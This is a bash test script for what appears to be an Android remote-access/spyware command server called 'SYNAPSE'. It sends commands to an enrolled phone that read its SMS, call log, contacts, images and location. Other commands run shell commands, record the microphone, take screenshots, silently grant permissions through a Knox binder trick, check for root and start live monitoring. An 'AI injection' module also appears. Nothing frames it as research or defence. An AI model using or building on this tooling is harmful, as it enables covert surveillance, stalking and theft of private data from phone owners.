#!/bin/bash
# ═══════════════════════════════════════════════════════
# SYNAPSE — FULL SYSTEM TEST
# Usage: bash test.sh
# ═══════════════════════════════════════════════════════
IP="192.168.1.9"
ID="a2a99ec51033f84f"
URL="https://$IP:8443"
CURL="curl -k -s"
DEV='{"device_id":"'"$ID"'"}'

post() { $CURL -X POST "$URL/api/command" -H "Content-Type: application/json" -d "$1"; echo; }

echo "╔══════════════════════════════════════════╗"
echo "║    SYNAPSE — FULL SYSTEM TEST          ║"
echo "╚══════════════════════════════════════════╝"
echo ""

# ── 1. HEALTH ──
echo "1. HEALTH CHECK"
$CURL "$URL/api/health" | python3 -m json.tool 2>/dev/null
echo ""

# ── 2. PING ──
echo "2. PING"
post '{"device_id":"'$ID'","module":"ping","action":"ping"}'
sleep 2
echo ""

# ── 3. DEVICE INFO ──
echo "3. DEVICE INFO"
post '{"device_id":"'$ID'","module":"info","action":"gather"}'
sleep 2
echo ""

# ── 4. SMS ──
echo "4. SMS (last 5)"
post '{"device_id":"'$ID'","module":"sms","action":"list","params":{"count":"5"}}'
sleep 3
echo ""

# ── 5. CALLS ──
echo "5. CALL LOG"
post '{"device_id":"'$ID'","module":"calls","action":"list","params":{"count":"5"}}'
sleep 3
echo ""

# ── 6. CONTACTS ──
echo "6. CONTACTS (first 10)"
post '{"device_id":"'$ID'","module":"contacts","action":"list","params":{"count":"10"}}'
sleep 3
echo ""

# ── 7. FILES ──
echo "7. FILES (images)"
post '{"device_id":"'$ID'","module":"files","action":"list","params":{"type":"images","count":"10"}}'
sleep 3
echo ""

# ── 8. SHELL ──
echo "8. SHELL (id, whoami, uname)"
post '{"device_id":"'$ID'","module":"shell","action":"exec","params":{"cmd":"id; whoami; uname -a"}}'
sleep 3
echo ""

# ── 9. LOCATION ──
echo "9. LOCATION (may timeout if GPS off)"
post '{"device_id":"'$ID'","module":"location","action":"get"}'
sleep 5
echo ""

# ── 10. MIC ──
echo "10. MIC (5s recording)"
post '{"device_id":"'$ID'","module":"mic","action":"record","params":{"duration":"5"}}'
sleep 8
echo ""

# ── 11. SCREENSHOT ──
echo "11. SCREENSHOT"
post '{"device_id":"'$ID'","module":"camera","action":"screenshot"}'
sleep 3
echo ""

# ── 12. SILENT GRANT ──
echo "12. SILENT PERMISSION GRANT"
post '{"device_id":"'$ID'","module":"silent_grant","action":"grant"}'
sleep 5
echo ""

# ── 13. KNOX GRANT ──
echo "13. KNOX BINDER GRANT"
post '{"device_id":"'$ID'","module":"knox","action":"grant"}'
sleep 10
echo ""

# ── 14. AI INJECT STATUS ──
echo "14. AI INJECTION STATUS"
post '{"device_id":"'$ID'","module":"ai_inject","action":"status"}'
sleep 3
echo ""

# ── 15. ROOT CHECK ──
echo "15. ROOT CHECK"
post '{"device_id":"'$ID'","module":"root","action":"check"}'
sleep 5
echo ""

# ── 16. LIVE MONITORING ──
echo "16. LIVE MONITORING START"
post '{"device_id":"'$ID'","module":"live","action":"start"}'
sleep 3
echo ""

echo "╔══════════════════════════════════════════╗"
echo "║    ALL TESTS SENT — CHECK DASHBOARD     ║"
echo "║    https://$IP:8443                     ║"
echo "╚══════════════════════════════════════════╝"
